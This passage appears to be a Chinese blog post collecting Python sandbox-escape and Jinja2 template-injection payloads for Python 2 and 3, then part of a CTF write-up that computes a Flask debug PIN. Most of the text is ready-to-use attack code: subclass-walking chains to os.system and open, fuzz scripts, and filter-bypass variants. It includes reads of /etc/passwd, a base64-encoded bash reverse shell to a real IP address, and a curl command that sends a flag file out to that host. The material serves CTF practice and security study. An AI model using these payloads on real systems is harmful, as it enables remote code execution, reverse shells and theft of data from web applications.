range(len(().__class__.__bases__[0].__subclasses__()))].index(&apos;file&apos;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &apos;warnings.catch_warnings&apos;&gt; 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() 5、命令执行 寻找包含os模块的脚本 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 得到 12345671 &lt;class &apos;site._Printer&apos;&gt;----76 &lt;class &apos;site.Quitter&apos;&gt; 前面已经找到了包含os模块的类，先初始化，再引用即可 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) 只不过命令执行没有回显，需要反弹shell或者利用curl带出 反弹shell 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg==|base64 -d|bash&apos;) curl带出 1&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;data=$(cat /fffffflag | base64);curl http://117.78.1.204/?data=$data;&apos;) catch_warnings也可以进一步构造来执行命令 1259&lt;class &apos;warnings.catch_warnings&apos;&gt; 先介绍两个属性，已知函数名可获取函数信息 1234567891011def fun(x=1): # nothing here a=x*2 flag=&apos;neko&apos; return aprint fun.func_code.co_constsprint fun.func_globals=&gt;(None, 2, &apos;neko&apos;)&#123;&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__file__&apos;: &apos;b.py&apos;, &apos;__package__&apos;: None, &apos;fun&apos;: &lt;function fun at 0x7f1b9317e750&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None&#125; 可构造 1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;) 还有几种变形 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&apos;l&apos;+&apos;s&apos;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&apos;ls&apos;)&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&apos;catch_warnings&apos;][0]()._module.__builtins__):getthem[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;))()&#125; Python 3.7.5 1、获取类对象 123456&gt;&gt;&gt; &apos;&apos;.__class__&lt;class &apos;str&apos;&gt;&gt;&gt;&gt; ().__class__&lt;class &apos;tuple&apos;&gt;&gt;&gt;&gt; [].__class__&lt;class &apos;list&apos;&gt; 2、寻找基类object 1234567&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;class &apos;str&apos;&gt;, &lt;class &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &apos;list&apos;&gt;, &lt;class &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &apos;object&apos;&gt; 3、寻找可用的引用 12&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1].__subclasses__()[&lt;class &apos;type&apos;&gt;, &lt;class &apos;weakref&apos;&gt;, &lt;class &apos;weakcallableproxy&apos;&gt;, &lt;class &apos;weakproxy&apos;&gt;, &lt;class &apos;int&apos;&gt;, &lt;class &apos;bytearray&apos;&gt;, &lt;class &apos;bytes&apos;&gt;, &lt;class &apos;list&apos;&gt;, &lt;class &apos;NoneType&apos;&gt;, &lt;class &apos;NotImplementedType&apos;&gt;, &lt;class &apos;traceback&apos;&gt;, &lt;class &apos;super&apos;&gt;, &lt;class &apos;range&apos;&gt;, &lt;class &apos;dict&apos;&gt;, &lt;class &apos;dict_keys&apos;&gt;, &lt;class &apos;dict_values&apos;&gt;, &lt;class &apos;dict_items&apos;&gt;, &lt;class &apos;odict_iterator&apos;&gt;, &lt;class &apos;set&apos;&gt;, &lt;class &apos;str&apos;&gt;, &lt;class &apos;slice&apos;&gt;, &lt;class &apos;staticmethod&apos;&gt;, &lt;class &apos;complex&apos;&gt;, &lt;class &apos;float&apos;&gt;, &lt;class &apos;frozenset&apos;&gt;, &lt;class &apos;property&apos;&gt;, &lt;class &apos;managedbuffer&apos;&gt;, &lt;class &apos;memoryview&apos;&gt;, &lt;class &apos;tuple&apos;&gt;, &lt;class &apos;enumerate&apos;&gt;, &lt;class &apos;reversed&apos;&gt;, &lt;class &apos;stderrprinter&apos;&gt;, &lt;class &apos;code&apos;&gt;, &lt;class &apos;frame&apos;&gt;, &lt;class &apos;builtin_function_or_method&apos;&gt;, &lt;class &apos;method&apos;&gt;, &lt;class &apos;function&apos;&gt;, &lt;class &apos;mappingproxy&apos;&gt;, &lt;class &apos;generator&apos;&gt;, &lt;class &apos;getset_descriptor&apos;&gt;, &lt;class &apos;wrapper_descriptor&apos;&gt;, &lt;class &apos;method-wrapper&apos;&gt;, &lt;class &apos;ellipsis&apos;&gt;, &lt;class &apos;member_descriptor&apos;&gt;, &lt;class &apos;types.SimpleNamespace&apos;&gt;, &lt;class &apos;PyCapsule&apos;&gt;, &lt;class &apos;longrange_iterator&apos;&gt;, &lt;class &apos;cell&apos;&gt;, &lt;class &apos;instancemethod&apos;&gt;, &lt;class &apos;classmethod_descriptor&apos;&gt;, &lt;class &apos;method_descriptor&apos;&gt;, &lt;class &apos;callable_iterator&apos;&gt;, &lt;class &apos;iterator&apos;&gt;, &lt;class &apos;coroutine&apos;&gt;, &lt;class &apos;coroutine_wrapper&apos;&gt;, &lt;class &apos;moduledef&apos;&gt;, &lt;class &apos;module&apos;&gt;, &lt;class &apos;EncodingMap&apos;&gt;, &lt;class &apos;fieldnameiterator&apos;&gt;, &lt;class &apos;formatteriterator&apos;&gt;, &lt;class &apos;filter&apos;&gt;, &lt;class &apos;map&apos;&gt;, &lt;class &apos;zip&apos;&gt;, &lt;class &apos;BaseException&apos;&gt;, &lt;class &apos;hamt&apos;&gt;, &lt;class &apos;hamt_array_node&apos;&gt;, &lt;class &apos;hamt_bitmap_node&apos;&gt;, &lt;class &apos;hamt_collision_node&apos;&gt;, &lt;class &apos;keys&apos;&gt;, &lt;class &apos;values&apos;&gt;, &lt;class &apos;items&apos;&gt;, &lt;class &apos;Context&apos;&gt;, &lt;class &apos;ContextVar&apos;&gt;, &lt;class &apos;Token&apos;&gt;, &lt;class &apos;Token.MISSING&apos;&gt;, &lt;class &apos;_frozen_importlib._ModuleLock&apos;&gt;, &lt;class &apos;_frozen_importlib._DummyModuleLock&apos;&gt;, &lt;class &apos;_frozen_importlib._ModuleLockManager&apos;&gt;, &lt;class &apos;_frozen_importlib._installed_safely&apos;&gt;, &lt;class &apos;_frozen_importlib.ModuleSpec&apos;&gt;, &lt;class &apos;_frozen_importlib.BuiltinImporter&apos;&gt;, &lt;class &apos;classmethod&apos;&gt;, &lt;class &apos;_frozen_importlib.FrozenImporter&apos;&gt;, &lt;class &apos;_frozen_importlib._ImportLockContext&apos;&gt;, &lt;class &apos;_thread._localdummy&apos;&gt;, &lt;class &apos;_thread._local&apos;&gt;, &lt;class &apos;_thread.lock&apos;&gt;, &lt;class &apos;_thread.RLock&apos;&gt;, &lt;class &apos;zipimport.zipimporter&apos;&gt;, &lt;class &apos;_frozen_importlib_external.WindowsRegistryFinder&apos;&gt;, &lt;class &apos;_frozen_importlib_external._LoaderBasics&apos;&gt;, &lt;class &apos;_frozen_importlib_external.FileLoader&apos;&gt;, &lt;class &apos;_frozen_importlib_external._NamespacePath&apos;&gt;, &lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;, &lt;class &apos;_frozen_importlib_external.PathFinder&apos;&gt;, &lt;class &apos;_frozen_importlib_external.FileFinder&apos;&gt;, &lt;class &apos;_io._IOBase&apos;&gt;, &lt;class &apos;_io._BytesIOBuffer&apos;&gt;, &lt;class &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;class &apos;posix.ScandirIterator&apos;&gt;, &lt;class &apos;posix.DirEntry&apos;&gt;, &lt;class &apos;codecs.Codec&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;codecs.StreamReaderWriter&apos;&gt;, &lt;class &apos;codecs.StreamRecoder&apos;&gt;, &lt;class &apos;_abc_data&apos;&gt;, &lt;class &apos;abc.ABC&apos;&gt;, &lt;class &apos;dict_itemiterator&apos;&gt;, &lt;class &apos;collections.abc.Hashable&apos;&gt;, &lt;class &apos;collections.abc.Awaitable&apos;&gt;, &lt;class &apos;collections.abc.AsyncIterable&apos;&gt;, &lt;class &apos;async_generator&apos;&gt;, &lt;class &apos;collections.abc.Iterable&apos;&gt;, &lt;class &apos;bytes_iterator&apos;&gt;, &lt;class &apos;bytearray_iterator&apos;&gt;, &lt;class &apos;dict_keyiterator&apos;&gt;, &lt;class &apos;dict_valueiterator&apos;&gt;, &lt;class &apos;list_iterator&apos;&gt;, &lt;class &apos;list_reverseiterator&apos;&gt;, &lt;class &apos;range_iterator&apos;&gt;, &lt;class &apos;set_iterator&apos;&gt;, &lt;class &apos;str_iterator&apos;&gt;, &lt;class &apos;tuple_iterator&apos;&gt;, &lt;class &apos;collections.abc.Sized&apos;&gt;, &lt;class &apos;collections.abc.Container&apos;&gt;, &lt;class &apos;collections.abc.Callable&apos;&gt;, &lt;class &apos;os._wrap_close&apos;&gt;, &lt;class &apos;_sitebuiltins.Quitter&apos;&gt;, &lt;class &apos;_sitebuiltins._Printer&apos;&gt;, &lt;class &apos;_sitebuiltins._Helper&apos;&gt;, &lt;class &apos;types.DynamicClassAttribute&apos;&gt;, &lt;class &apos;types._GeneratorWrapper&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;importlib.abc.Finder&apos;&gt;, &lt;class &apos;importlib.abc.Loader&apos;&gt;, &lt;class &apos;importlib.abc.ResourceReader&apos;&gt;, &lt;class &apos;operator.itemgetter&apos;&gt;, &lt;class &apos;operator.attrgetter&apos;&gt;, &lt;class &apos;operator.methodcaller&apos;&gt;, &lt;class &apos;itertools.accumulate&apos;&gt;, &lt;class &apos;itertools.combinations&apos;&gt;, &lt;class &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;class &apos;itertools.cycle&apos;&gt;, &lt;class &apos;itertools.dropwhile&apos;&gt;, &lt;class &apos;itertools.takewhile&apos;&gt;, &lt;class &apos;itertools.islice&apos;&gt;, &lt;class &apos;itertools.starmap&apos;&gt;, &lt;class &apos;itertools.chain&apos;&gt;, &lt;class &apos;itertools.compress&apos;&gt;, &lt;class &apos;itertools.filterfalse&apos;&gt;, &lt;class &apos;itertools.count&apos;&gt;, &lt;class &apos;itertools.zip_longest&apos;&gt;, &lt;class &apos;itertools.permutations&apos;&gt;, &lt;class &apos;itertools.product&apos;&gt;, &lt;class &apos;itertools.repeat&apos;&gt;, &lt;class &apos;itertools.groupby&apos;&gt;, &lt;class &apos;itertools._grouper&apos;&gt;, &lt;class &apos;itertools._tee&apos;&gt;, &lt;class &apos;itertools._tee_dataobject&apos;&gt;, &lt;class &apos;reprlib.Repr&apos;&gt;, &lt;class &apos;collections.deque&apos;&gt;, &lt;class &apos;_collections._deque_iterator&apos;&gt;, &lt;class &apos;_collections._deque_reverse_iterator&apos;&gt;, &lt;class &apos;collections._Link&apos;&gt;, &lt;class &apos;functools.partial&apos;&gt;, &lt;class &apos;functools._lru_cache_wrapper&apos;&gt;, &lt;class &apos;functools.partialmethod&apos;&gt;, &lt;class &apos;contextlib.ContextDecorator&apos;&gt;, &lt;class &apos;contextlib._GeneratorContextManagerBase&apos;&gt;, &lt;class &apos;contextlib._BaseExitStack&apos;&gt;, &lt;class &apos;rlcompleter.Completer&apos;&gt;] 4、文件读取/命令执行 3个本地测试成功的payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;127&lt;class &apos;os._wrap_close&apos;&gt;-1&lt;class &apos;rlcompleter.Completer&apos;&gt; 通过观察，其实就是__global__中存在sys或者system或者__builtins__模块 FUZZ脚本 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzz出很多其他的，测试一下 尝试自己构造for循环 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &apos;sys&apos; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 一个0代表执行一次🤦‍♂️，命令执行的结果无法回显，利用curl带出 当然也可以指定模块名，就可以只执行一次，比如前面FUZZ出来的 1sys 128 &lt;class &apos;_sitebuiltins.Quitter&apos;&gt; 注意是后半部分Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Quitter&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 上面三个模块中__builtins__最为丰富 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;, &apos;r&apos;).read() 比如还有chr()函数 Jinja2的for循环处理 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Repr&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Repr&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; eval执行的好处是直接有回显， Some Tricks（测试环境为Py2）.被过滤 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;) 使用getattr() 123456[].__class__ =&gt; getattr([],&apos;__class__&apos;)[].__class__.__base__ =&gt; getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;)[].__class__.__base__.__subclasses__()[59] =&gt; getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59][].__class__.__base__.__subclasses__()[59].__init__ =&gt; getattr(getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59],&apos;__init__&apos;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59],&apos;__init__&apos;),&apos;__globals__&apos;)[&apos;linecache&apos;],&apos;__dict__&apos;)[&apos;os&apos;],&apos;system&apos;)(&apos;ls&apos;) _被过滤 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&apos;class&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;base&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;subclasses&apos;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&apos;init&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;globals&apos;+dir(0)[0][0]*2)[&apos;linecache&apos;],dir(0)[0][0]*2+&apos;dict&apos;+dir(0)[0][0]*2)[&apos;os&apos;],&apos;system&apos;)(&apos;ls&apos;) 中括号被过滤 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() 可以用getitem和pop进行绕过过滤 1&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() 引号被过滤 先获取chr()再将文件名拼接 1&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 过滤双括号)) 利用文件盲注 1&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/aa&apos;).read()[0:1]==&apos;f&apos; %&#125;~ok~&#123;% endif %&#125; 写个脚本即可 总结通用的payload 基类 12&apos;&apos;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; 下标一般是40，如果不行的话也可爆破试试 1&apos;&apos;.__class__.__mro__[-1].__subclasses__()[40](&apos;/etc/passwd&apos;).read() os、__builtins__、linecache模块 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read()&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls&apos;)&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) 这里有很多变形可以参考上面的 jinja2的for循环一把梭 12345&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;Quitter&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sys、system、__builtins__模块，其中__builtins__和python2的略有不同 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;) jinja2的for循环一把梭 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &apos;&apos;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;system&apos;](&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================分割线 安恒杯抗疫月赛 没打比赛，似乎是过滤了.和_， 我想到的payload 1getattr(getattr(getattr(getattr(getattr(&apos;&apos;,dir(0)[0][0]*2+&apos;class&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;mro&apos;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&apos;subclasses&apos;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&apos;init&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;globals&apos;+dir(0)[0][0]*2)[&apos;system&apos;](&apos;ls&apos;) 赛后看到下面两个payload payload1，利用16进制编码 1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&apos;\\x5f\\x5fimport\\x5f\\x5f&apos;](&apos;os&apos;)[&quot;popen&quot;](&apos;cat%20/flag*&apos;)[&apos;read&apos;]()&#125;&#125; payload2，利用request 1&#123;&#123;()|attr(request[&apos;args&apos;][&apos;x1&apos;])|attr(request[&apos;args&apos;][&apos;x2&apos;])|attr(request[&apos;args&apos;][&apos;x3&apos;])()|attr(request[&apos;args&apos;][&apos;x4&apos;])(233)|attr(request[&apos;args&apos;][&apos;x5&apos;])|attr(request[&apos;args&apos;][&apos;x6&apos;])|attr(request[&apos;args&apos;][&apos;x4&apos;])(request[&apos;args&apos;][&apos;x7&apos;])|attr(request[&apos;args&apos;][&apos;x4&apos;])(request[&apos;args&apos;][&apos;x8&apos;])(request[&apos;args&apos;][&apos;x9&apos;])&#125;&#125;?x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&apos;想要执行的命令&apos;).read() 这里突然意识到文章前面都没有提到过滤器，而在模版引擎中过滤器也有很多szs 12345#比如flag被过滤，|reverse&apos;&apos;.__class__.__mro__[-1].__subclasses__()[40](&apos;galf&apos;|reverse).read()#比如getattr被过滤，|attr(&apos;&apos;|attr(&apos;__class__&apos;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|last，取序列最后一个元素等等 =======================分割线 参考链接： http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://glotozz.github.io/tags/SSTI/"}]},{"title":"2020新春战疫-网络安全公益赛-3","slug":"2020新春战疫-网络安全公益赛-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T07:08:39.311Z","comments":true,"path":"2020/02/23/2020新春战疫-网络安全公益赛-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020新春战疫-网络安全公益赛-3/","excerpt":"","text":"Flaskapphint中提示PIN，那么估计利用debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debug得到源码 读取配置利用自带的/encode，然后传入/decode 1&lt;Config &#123;&apos;ENV&apos;: &apos;production&apos;, &apos;DEBUG&apos;: True, &apos;TESTING&apos;: False, &apos;PROPAGATE_EXCEPTIONS&apos;: None, &apos;PRESERVE_CONTEXT_ON_EXCEPTION&apos;: None, &apos;SECRET_KEY&apos;: &apos;s_e_c_r_e_t_k_e_y&apos;, &apos;PERMANENT_SESSION_LIFETIME&apos;: datetime.timedelta(days=31), &apos;USE_X_SENDFILE&apos;: False, &apos;SERVER_NAME&apos;: None, &apos;APPLICATION_ROOT&apos;: &apos;/&apos;, &apos;SESSION_COOKIE_NAME&apos;: &apos;session&apos;, &apos;SESSION_COOKIE_DOMAIN&apos;: False, &apos;SESSION_COOKIE_PATH&apos;: None, &apos;SESSION_COOKIE_HTTPONLY&apos;: True, &apos;SESSION_COOKIE_SECURE&apos;: False, &apos;SESSION_COOKIE_SAMESITE&apos;: None, &apos;SESSION_REFRESH_EACH_REQUEST&apos;: True, &apos;MAX_CONTENT_LENGTH&apos;: None, &apos;SEND_FILE_MAX_AGE_DEFAULT&apos;: datetime.timedelta(seconds=43200), &apos;TRAP_BAD_REQUEST_ERRORS&apos;: None, &apos;TRAP_HTTP_EXCEPTIONS&apos;: False, &apos;EXPLAIN_TEMPLATE_LOADING&apos;: False, &apos;PREFERRED_URL_SCHEME&apos;: &apos;http&apos;, &apos;JSON_AS_ASCII&apos;: True, &apos;JSON_SORT_KEYS&apos;: True, &apos;JSONIFY_PRETTYPRINT_REGULAR&apos;: False, &apos;JSONIFY_MIMETYPE&apos;: &apos;application/json&apos;, &apos;TEMPLATES_AUTO_RELOAD&apos;: None, &apos;MAX_COOKIE_SIZE&apos;: 4093, &apos;BOOTSTRAP_USE_MINIFIED&apos;: True, &apos;BOOTSTRAP_CDN_FORCE_SSL&apos;: False, &apos;BOOTSTRAP_QUERYSTRING_REVVING&apos;: True, &apos;BOOTSTRAP_SERVE_LOCAL&apos;: False, &apos;BOOTSTRAP_LOCAL_SUBDOMAIN&apos;: None&#125;&gt; 还是得生成PIN，需要读取一些配置文件 https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload 文件读取 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/etc/passwd&apos;).read()&#125;&#125; 命令执行 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;__global&apos;+&apos;s__&apos;)[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;)&#125;&#125; 都被waf 查看网卡 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/sys/class/net/eth0/address&apos;).read()&#125;&#125; 得到02:42:ac:12:00:02=&gt;2485377957890 在docker中，查看机器码 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/proc/self/cgroup&apos;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 